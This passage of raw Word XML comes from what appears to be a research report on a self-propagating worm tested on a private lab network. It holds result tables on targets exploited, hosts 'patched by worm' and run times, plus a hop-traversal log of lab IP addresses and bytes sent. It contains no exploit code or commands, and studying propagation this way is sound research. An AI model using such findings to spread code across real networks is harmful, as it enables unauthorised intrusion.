            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Total Targets (existent and non-existent)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>38</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Total Existent Targets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>34</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Expected Exploitable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>27</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Actual Exploited</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>13</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Expected Patched by Worm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>26</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Actual Patched by Worm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>12</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Expected Unaffected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>7</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Actual Unaffected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>21</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Actual Crash</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A50F90" w:rsidTr="002172F1">
        <w:trPr>
          <w:trHeight w:val="509"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4225" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90" w:rsidP="002172F1">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Run Time (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>min:sec</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRDefault="00A50F90">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>13:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00A50F9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We see a similar pattern as from the first iteration, but this time the number of “Actual Exploited” changes.  As mentioned in the first iteration results this is due to unanticipated performance factors of the target where it simply doesn't respond in time.  The worm could retry or wait longer, but this would have the effect of slowing down the propagation of the worm.  In this iteration different machines did respond and execute the worm that had not done so in the previous iteration.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00842A98" w:rsidRPr="00842A98" w:rsidRDefault="00842A98" w:rsidP="00842A98">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc321730223"/>
      <w:r w:rsidRPr="00842A98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00842A98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00842A98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00842A98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00842A98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00842A98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Third Iteration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83541E" w:rsidTr="002172F1">
        <w:trPr>
          <w:trHeight w:val="509"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4225" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRPr="00AE05C3" w:rsidRDefault="0083541E" w:rsidP="002172F1">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Total Targets (existent and non-existent)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>38</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Total Existent Targets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>34</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Expected Exploitable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>27</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Actual Exploited</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>13</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Expected Patched by Worm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>26</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Actual Patched by Worm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>12</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Expected Unaffected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>7</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Actual Unaffected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>21</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Actual Crash</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0083541E" w:rsidTr="002172F1">
        <w:trPr>
          <w:trHeight w:val="509"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4225" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E" w:rsidP="002172F1">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Run Time (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>min:sec</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="0083541E" w:rsidRDefault="0083541E">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>13:48</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00A61320" w:rsidRDefault="00A61320" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00A6132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A run-down of the log data shows the following hop traversal:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00987FD3" w:rsidRPr="00987FD3" w:rsidRDefault="00987FD3" w:rsidP="00987FD3">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc321730224"/>
      <w:r w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Hop Traversal</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4"/>
        <w:gridCol w:w="1531"/>
        <w:gridCol w:w="2067"/>
        <w:gridCol w:w="1619"/>
        <w:gridCol w:w="2709"/>
      </w:tblGrid>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2F1339" w:rsidRDefault="00CB26A3" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Hop</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2F1339" w:rsidRDefault="00BD757B" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Start T</w:t>
            </w:r>
            <w:r w:rsidR="00CB26A3" w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>ime</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2F1339" w:rsidRDefault="00CB26A3" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Targets Attempted</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2F1339" w:rsidRDefault="00CB26A3" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Successful Target</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CD3" w:rsidRPr="002F1339" w:rsidRDefault="00CB26A3" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Bytes sent over network</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CB26A3" w:rsidRPr="002F1339" w:rsidRDefault="00CB26A3" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:i/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F1339">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:i/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>(excluding TCP overhead)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CA0CD3" w:rsidRPr="00861880" w:rsidTr="00914BF0">
        <w:trPr>
          <w:trHeight w:val="20"/>
        </w:trPr>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20:37:35,734</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2,797,359</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20:37:38,670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9E2943" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>192.168.0.151-</w:t>
            </w:r>
            <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>152</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192.168.0.152</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2,799,734</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20:38:06,623</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2,797,315</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20:39:36,343</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7F56AD" w:rsidRDefault="00CB26A3" w:rsidP="009E2943">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>192.168.0.154</w:t>
            </w:r>
            <w:r w:rsidR="009E2943">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>-160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603F80" w:rsidRDefault="00FD5ECA" w:rsidP="00914BF0">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD5ECA">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2,811,634</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20:41:22,281</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192.168.0.161</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192.168.0.161</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2,797,195</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lastRenderedPageBreak/>
              <w:t>192.168.0.161</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20:41:48,61</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192.168.0.162</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192.168.0.162</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2,797,180</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20:43:17,170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2,797,165</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20:44:46,810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E2943">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192.168.0.164</w:t>
            </w:r>
            <w:r w:rsidR="009E2943">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
            <w:r w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>170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2,811,484</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20:46:25,687</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192.168.0.171</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192.168.0.171</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2,797,045</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192.168.0.171</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20:46:51,592</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E2943">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192.168.0.172</w:t>
            </w:r>
            <w:r w:rsidR="009E2943">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
            <w:r w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>173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2,805,969</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20:47:18,639</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192.168.0.174</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192.168.0.174</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2,797,000</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192.168.0.174</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20:47:52,405</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192.168.0.175</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192.168.0.175</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2,796,985</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192.168.0.175</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20:48:55,608</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E2943">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192.168.0.176</w:t>
            </w:r>
            <w:r w:rsidR="009E2943">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
            <w:r w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>186</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192.168.0.186</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2,808,840</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
